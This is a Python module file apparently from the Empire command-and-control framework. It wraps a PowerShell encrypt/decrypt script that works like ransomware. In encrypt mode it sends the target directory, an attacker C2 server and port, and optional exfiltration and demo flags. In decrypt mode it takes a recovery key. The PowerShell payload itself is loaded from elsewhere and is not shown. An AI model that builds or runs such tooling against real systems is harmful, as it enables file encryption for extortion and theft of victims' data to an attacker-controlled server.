from empire.server.common.empire import MainMenu
from empire.server.core.exceptions import (
    ModuleValidationException,
)
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            raise ModuleValidationException("Invalid module source")

        mode_flag = "-e" if params["Mode"] == "Encrypt" else "-d"
        args = f"$args = @('{mode_flag}', '{params['Directory']}'"

        if params["Mode"] == "Encrypt":
            args += f", '-s', '{params['C2Server']}', '-p', '{params['C2Port']}'"
            if params.get("Exfiltrate") == "True":
                args += ", '-x'"
            if params.get("Demo") == "True":
                args += ", '-demo'"

        elif params["Mode"] == "Decrypt":
            args += f", '-k', '{params['RecoveryKey']}'"

        args += ")\n"

        script = args + script
        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
